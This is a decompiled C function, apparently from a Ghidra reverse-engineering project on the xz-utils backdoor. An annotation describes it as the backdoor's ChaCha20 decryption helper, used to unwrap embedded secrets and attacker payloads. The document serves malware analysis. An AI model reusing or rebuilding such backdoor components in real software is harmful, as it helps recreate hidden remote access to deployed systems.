// /home/kali/xzre-ghidra/xzregh/107190_chacha_decrypt.c
// Function: chacha_decrypt @ 0x107190
// Calling convention: unknown
// Prototype: undefined chacha_decrypt(void)


/*
 * AutoDoc: Thin wrapper around OpenSSL's ChaCha20 decrypt primitives that operates through the resolved imports table. The backdoor uses it both to unwrap its embedded secrets and to decrypt attacker payloads after they arrive via the monitor channel.
 */
#include "xzre_types.h"


undefined4
chacha_decrypt(long param_1,uint param_2,undefined8 param_3,long param_4,long param_5,long param_6)

{
  code *pcVar1;
  int iVar2;
  long lVar3;
  undefined8 uVar4;
  int outl;
  
  outl = 0;
  if (((((param_1 != 0) && (param_2 != 0)) && (param_4 != 0)) && ((param_5 != 0 && (param_6 != 0))))
     && ((lVar3 = param_6, iVar2 = contains_null_pointers(param_6 + 0xa0,6), iVar2 == 0 &&
         (lVar3 = (**(code **)(lVar3 + 0xa0))(), lVar3 != 0)))) {
    pcVar1 = *(code **)(param_6 + 0xa8);
    uVar4 = (**(code **)(param_6 + 200))();
    iVar2 = (*pcVar1)(lVar3,uVar4,0,param_3,param_4);
    if (iVar2 == 1) {
      iVar2 = (**(code **)(param_6 + 0xb0))(lVar3,param_5,&outl,param_1,param_2);
      if (((iVar2 == 1) && (-1 < outl)) &&
         ((iVar2 = (**(code **)(param_6 + 0xb8))(lVar3,param_5 + outl,&outl), iVar2 == 1 &&
          ((-1 < outl && ((uint)outl <= param_2)))))) {
        (**(code **)(param_6 + 0xc0))(lVar3);
        return 1;
      }
    }
    if (*(code **)(param_6 + 0xc0) != (code *)0x0) {
      (**(code **)(param_6 + 0xc0))(lVar3);
    }
  }
  return 0;
}

